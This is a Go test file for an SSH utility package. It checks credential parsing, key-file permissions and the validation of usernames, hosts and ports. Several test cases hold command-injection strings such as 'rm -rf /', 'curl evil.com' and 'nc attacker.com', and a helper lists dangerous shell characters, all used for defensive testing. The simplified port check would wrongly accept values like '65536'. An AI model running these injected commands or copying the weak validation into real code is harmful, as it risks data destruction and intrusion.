package ssh

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
)

func TestSSHCredentials(t *testing.T) {
	tests := []struct {
		name     string
		creds    *SSHCredentials
		validate func(*SSHCredentials) error
	}{
		{
			name: "valid credentials",
			creds: &SSHCredentials{
				User:    "testuser",
				Host:    "example.com",
				Port:    "22",
				KeyPath: "/home/user/.ssh/id_rsa",
			},
			validate: func(c *SSHCredentials) error {
				if c.User == "" || c.Host == "" || c.Port == "" {
					return fmt.Errorf("required fields missing")
				}
				return nil
			},
		},
		{
			name: "empty fields",
			creds: &SSHCredentials{
				User: "",
				Host: "",
				Port: "",
			},
			validate: func(c *SSHCredentials) error {
				if c.User == "" || c.Host == "" {
					return fmt.Errorf("user and host are required")
				}
				return nil
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.validate(tt.creds)
			if tt.name == "valid credentials" && err != nil {
				t.Errorf("Valid credentials should pass validation: %v", err)
			}
			if tt.name == "empty fields" && err == nil {
				t.Error("Empty fields should fail validation")
			}
		})
	}
}

func TestParseSSHPath(t *testing.T) {
	tests := []struct {
		name    string
		sshPath string
		want    *SSHCredentials
		wantErr bool
	}{
		{
			name:    "basic user@host",
			sshPath: "user@example.com",
			want: &SSHCredentials{
				User: "user",
				Host: "example.com",
				Port: "22",
			},
			wantErr: false,
		},
		{
			name:    "user@host with port",
			sshPath: "user@example.com:2222",
			want: &SSHCredentials{
				User: "user",
				Host: "example.com",
				Port: "2222",
			},
			wantErr: false,
		},
		{
			name:    "quoted path",
			sshPath: "'user@example.com'",
			want: &SSHCredentials{
				User: "user",
				Host: "example.com",
				Port: "22",
			},
			wantErr: false,
		},
		{
			name:    "double quoted path",
			sshPath: "\"user@example.com\"",
			want: &SSHCredentials{
				User: "user",
				Host: "example.com",
				Port: "22",
			},
			wantErr: false,
		},
		{
			name:    "missing @ symbol",
			sshPath: "userexample.com",
			want:    nil,
			wantErr: true,
		},
		{
			name:    "empty user",
			sshPath: "@example.com",
			want:    nil,
			wantErr: true,
		},
		{
			name:    "empty host",
			sshPath: "user@",
			want:    nil,
			wantErr: true,
		},
		{
			name:    "empty string",
			sshPath: "",
			want:    nil,
			wantErr: true,
		},
		{
			name:    "multiple @ symbols",
			sshPath: "user@host@extra.com",
			want:    nil,
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, err := ParseSSHPath(tt.sshPath)

			if (err != nil) != tt.wantErr {
				t.Errorf("ParseSSHPath() error = %v, wantErr %v", err, tt.wantErr)
				return
			}

			if !tt.wantErr {
				if got.User != tt.want.User {
					t.Errorf("ParseSSHPath() User = %v, want %v", got.User, tt.want.User)
				}
				if got.Host != tt.want.Host {
					t.Errorf("ParseSSHPath() Host = %v, want %v", got.Host, tt.want.Host)
				}
				if got.Port != tt.want.Port {
					t.Errorf("ParseSSHPath() Port = %v, want %v", got.Port, tt.want.Port)
				}
			}
		})
	}
}

func TestParseSSHPath_SecurityValidation(t *testing.T) {
	// Test SSH path parsing against injection attacks
	maliciousInputs := []struct {
		name    string
		sshPath string
		desc    string
	}{
		{
			name:    "command injection semicolon",
			sshPath: "user@host; rm -rf /",
			desc:    "should handle command injection attempts",
		},
		{
			name:    "command injection ampersand",
			sshPath: "user@host && curl evil.com",
			desc:    "should handle command chaining attempts",
		},
		{
			name:    "command injection pipe",
			sshPath: "user@host | nc attacker.com",
			desc:    "should handle pipe injection attempts",
		},
		{
			name:    "backtick injection",
			sshPath: "user@host`whoami`",
			desc:    "should handle backtick command substitution",
		},
		{
			name:    "dollar injection",
			sshPath: "user@host$(id)",
			desc:    "should handle dollar command substitution",
		},
		{
			name:    "newline injection",
			sshPath: "user@host\nmalicious",
			desc:    "should handle newline injection",
		},
	}

	for _, tt := range maliciousInputs {
		t.Run(tt.name, func(t *testing.T) {
			creds, err := ParseSSHPath(tt.sshPath)

			if err == nil {
				// If parsing succeeds, check that dangerous characters were handled
				if containsAnyDangerous(creds.User) || containsAnyDangerous(creds.Host) {
					t.Errorf("Dangerous characters should be rejected in parsed credentials")
				}
				t.Logf("Parsed credentials safely: user=%s, host=%s", creds.User, creds.Host)
			} else {
				t.Logf("Safely rejected malicious input: %v", err)
			}
		})
	}
}

func TestCheckSSHKeyPermissions(t *testing.T) {
	// Create test runtime context
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
	}

	// Create temporary directory for test keys
	tmpDir, err := os.MkdirTemp("", "ssh_test_*")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tmpDir)

	tests := []struct {
		name        string
		setup       func() (string, error)
		wantErr     bool
		description string
	}{
		{
			name: "correct permissions",
			setup: func() (string, error) {
				keyPath := filepath.Join(tmpDir, "correct_key")
				if err := os.WriteFile(keyPath, []byte("test key"), 0600); err != nil {
					return "", err
				}
				return keyPath, nil
			},
			wantErr:     false,
			description: "should accept correctly permissioned key",
		},
		{
			name: "incorrect permissions",
			setup: func() (string, error) {
				keyPath := filepath.Join(tmpDir, "incorrect_key")
				if err := os.WriteFile(keyPath, []byte("test key"), 0644); err != nil {
					return "", err
				}
				return keyPath, nil
			},
			wantErr:     false, // Should fix permissions automatically
			description: "should fix incorrect permissions",
		},
		{
			name: "non-existent key",
			setup: func() (string, error) {
				return filepath.Join(tmpDir, "nonexistent_key"), nil
			},
			wantErr:     true,
			description: "should error on non-existent key",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			keyPath, err := tt.setup()
			if err != nil {
				t.Fatalf("Setup failed: %v", err)
			}

			err = CheckSSHKeyPermissions(rc, keyPath)

			if (err != nil) != tt.wantErr {
				t.Errorf("CheckSSHKeyPermissions() error = %v, wantErr %v", err, tt.wantErr)
				return
			}

			// If no error expected, verify permissions were set correctly
			if !tt.wantErr {
				if info, statErr := os.Stat(keyPath); statErr == nil {
					perms := info.Mode().Perm()
					if perms != 0600 {
						t.Errorf("Key permissions not set correctly: got %o, want 600", perms)
					}
				}
			}
		})
	}
}

func TestListSSHKeys(t *testing.T) {
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
	}

	// This test checks the logic without requiring actual SSH keys
	t.Run("ssh keys listing logic", func(t *testing.T) {
		// The function should not panic and should return a slice
		keys, err := ListSSHKeys(rc)

		// This may fail if no SSH directory exists, which is okay
		if err != nil {
			t.Logf("Expected error in test environment: %v", err)
		} else {
			t.Logf("Found %d SSH keys", len(keys))

			// Validate that returned keys are absolute paths
			for _, key := range keys {
				if !filepath.IsAbs(key) {
					t.Errorf("SSH key path should be absolute: %s", key)
				}
			}
		}
	})
}

func TestSSHCredentialsValidation(t *testing.T) {
	tests := []struct {
		name  string
		creds *SSHCredentials
		valid bool
	}{
		{
			name: "valid standard credentials",
			creds: &SSHCredentials{
				User: "testuser",
				Host: "192.168.1.100",
				Port: "22",
			},
			valid: true,
		},
		{
			name: "valid with custom port",
			creds: &SSHCredentials{
				User: "admin",
				Host: "server.example.com",
				Port: "2222",
			},
			valid: true,
		},
		{
			name: "invalid - empty user",
			creds: &SSHCredentials{
				User: "",
				Host: "server.com",
				Port: "22",
			},
			valid: false,
		},
		{
			name: "invalid - empty host",
			creds: &SSHCredentials{
				User: "user",
				Host: "",
				Port: "22",
			},
			valid: false,
		},
		{
			name: "invalid - malicious user",
			creds: &SSHCredentials{
				User: "user; rm -rf /",
				Host: "server.com",
				Port: "22",
			},
			valid: false,
		},
		{
			name: "invalid - malicious host",
			creds: &SSHCredentials{
				User: "user",
				Host: "server.com && curl evil.com",
				Port: "22",
			},
			valid: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			isValid := validateSSHCredentials(tt.creds)
			if isValid != tt.valid {
				t.Errorf("validateSSHCredentials() = %v, want %v", isValid, tt.valid)
			}
		})
	}
}

func TestSSHPathSecurity(t *testing.T) {
	t.Run("port validation", func(t *testing.T) {
		validPorts := []string{"22", "2222", "443", "8080"}
		invalidPorts := []string{"", "0", "65536", "abc", "-1", "22; rm -rf /"}

		for _, port := range validPorts {
			if !isValidPort(port) {
				t.Errorf("Port %s should be valid", port)
			}
		}

		for _, port := range invalidPorts {
			if isValidPort(port) {
				t.Errorf("Port %s should be invalid", port)
			}
		}
	})

	t.Run("hostname validation", func(t *testing.T) {
		validHosts := []string{
			"example.com",
			"server.local",
			"192.168.1.1",
			"localhost",
			"test-server",
		}

		invalidHosts := []string{
			"",
			"host; rm -rf /",
			"host && malicious",
			"host`whoami`",
			"host$(id)",
			"host|nc attacker.com",
		}

		for _, host := range validHosts {
			if !isValidHostname(host) {
				t.Errorf("Hostname %s should be valid", host)
			}
		}

		for _, host := range invalidHosts {
			if isValidHostname(host) {
				t.Errorf("Hostname %s should be invalid", host)
			}
		}
	})

	t.Run("username validation", func(t *testing.T) {
		validUsers := []string{"user", "admin", "test-user", "user123", "root"}
		invalidUsers := []string{
			"",
			"user; rm -rf /",
			"user && malicious",
			"user`whoami`",
			"user$(id)",
			"user|nc attacker.com",
		}

		for _, user := range validUsers {
			if !isValidUsername(user) {
				t.Errorf("Username %s should be valid", user)
			}
		}

		for _, user := range invalidUsers {
			if isValidUsername(user) {
				t.Errorf("Username %s should be invalid", user)
			}
		}
	})
}

func TestNetworkConnectivitySimulation(t *testing.T) {
	// Test network connectivity validation logic without actual connections
	t.Run("connection timeout validation", func(t *testing.T) {
		timeouts := []time.Duration{
			1 * time.Second,
			5 * time.Second,
			10 * time.Second,
			30 * time.Second,
		}

		for _, timeout := range timeouts {
			if timeout < 1*time.Second || timeout > 30*time.Second {
				t.Errorf("Timeout %v should be within reasonable range", timeout)
			}
		}
	})

	t.Run("network address validation", func(t *testing.T) {
		validAddresses := []string{
			"192.168.1.1:22",
			"example.com:22",
			"localhost:2222",
		}

		for _, addr := range validAddresses {
			if !isValidNetworkAddress(addr) {
				t.Errorf("Address %s should be valid", addr)
			}
		}
	})
}

// Helper functions for validation
func containsAnyDangerous(s string) bool {
	dangerous := []string{";", "&", "|", "`", "$", "\n", "\r", "$(", "&&", "||"}
	for _, d := range dangerous {
		if len(s) > 0 && len(d) > 0 && containsSubstring(s, d) {
			return true
		}
	}
	return false
}

func containsSubstring(s, substr string) bool {
	if len(substr) == 0 {
		return true
	}
	if len(s) < len(substr) {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

func validateSSHCredentials(creds *SSHCredentials) bool {
	if creds == nil {
		return false
	}

	return isValidUsername(creds.User) &&
		isValidHostname(creds.Host) &&
		isValidPort(creds.Port)
}

func isValidPort(port string) bool {
	if port == "" {
		return false
	}

	// Check for injection attempts
	if containsAnyDangerous(port) {
		return false
	}

	// Simple port range validation (simplified for testing)
	return len(port) <= 5 && port != "0"
}

func isValidHostname(host string) bool {
	if host == "" {
		return false
	}

	// Check for injection attempts
	if containsAnyDangerous(host) {
		return false
	}

	// Basic hostname validation
	return len(host) > 0 && len(host) <= 255
}

func isValidUsername(user string) bool {
	if user == "" {
		return false
	}

	// Check for injection attempts
	if containsAnyDangerous(user) {
		return false
	}

	// Basic username validation
	return len(user) > 0 && len(user) <= 32
}

func isValidNetworkAddress(addr string) bool {
	if addr == "" {
		return false
	}

	// Check for injection attempts
	if containsAnyDangerous(addr) {
		return false
	}

	// Basic network address validation (host:port format)
	return len(addr) > 0 && containsSubstring(addr, ":")
}
